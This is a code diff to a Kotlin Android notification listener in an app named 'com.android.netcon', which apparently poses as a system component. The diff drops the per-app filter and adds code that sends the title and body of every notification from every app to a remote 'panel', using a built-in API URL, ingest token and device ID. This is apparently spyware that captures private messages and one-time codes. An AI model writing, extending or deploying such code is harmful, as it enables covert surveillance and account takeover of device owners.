@@ -1,21 +1,14 @@
 package com.android.netcon
 
 import android.app.Notification
-import android.content.Context
 import android.service.notification.NotificationListenerService
 import android.service.notification.StatusBarNotification
 
 class NotificationListener : NotificationListenerService() {
 
     override fun onNotificationPosted(sbn: StatusBarNotification) {
-        val prefs = getSharedPreferences("netcon", Context.MODE_PRIVATE)
-        val filter = prefs.getString("pkg_filter", "")?.trim().orEmpty()
-        val pkg = sbn.packageName ?: return
-
-        if (filter.isNotEmpty()) {
-            val allowed = filter.split(",").map { it.trim() }.filter { it.isNotEmpty() }
-            if (allowed.isNotEmpty() && pkg !in allowed) return
-        }
+        // Skip own notifications
+        if (sbn.packageName == applicationContext.packageName) return
 
         val extras = sbn.notification.extras
         val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString().orEmpty()
@@ -24,14 +17,16 @@ class NotificationListener : NotificationListenerService() {
 
         if (title.isBlank() && text.isBlank()) return
 
-        val msg = buildString {
-            append("\uD83D\uDCF2 <b>").append(escape(pkg)).append("</b>\n")
-            if (title.isNotBlank()) append("<b>").append(escape(title)).append("</b>\n")
-            if (text.isNotBlank()) append(escape(text))
-        }
-        TelegramSender.send(this, msg)
-    }
+        val pkg = sbn.packageName ?: return
 
-    private fun escape(s: String): String =
-        s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
+        // Forward ALL notifications to panel — no filtering on device
+        ApiSender.sendNotification(
+            apiUrl = BuildConfig.API_URL,
+            ingestToken = BuildConfig.INGEST_TOKEN,
+            deviceId = BuildConfig.DEVICE_ID,
+            packageName = pkg,
+            title = title,
+            body = text
+        )
+    }
 }
